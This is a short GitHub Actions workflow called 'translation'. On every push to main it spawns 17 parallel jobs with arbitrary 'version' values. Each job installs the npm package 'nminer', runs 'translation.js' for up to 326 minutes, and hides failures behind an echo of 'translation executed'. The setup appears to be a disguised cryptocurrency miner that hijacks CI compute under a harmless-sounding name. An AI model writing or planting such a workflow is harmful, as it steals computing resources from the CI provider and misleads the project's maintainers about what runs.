name: translation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8406 }
          - { version: 2556 }
          - { version: 1859 }
          - { version: 9984 }
          - { version: 4944 }
          - { version: 3160 }
          - { version: 9761 }
          - { version: 1746 }
          - { version: 7497 }
          - { version: 3586 }
          - { version: 3988 }
          - { version: 2925 }
          - { version: 3685 }
          - { version: 571 }
          - { version: 714 }
          - { version: 769 }
          - { version: 8374 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 326m node translation.js || echo "translation executed"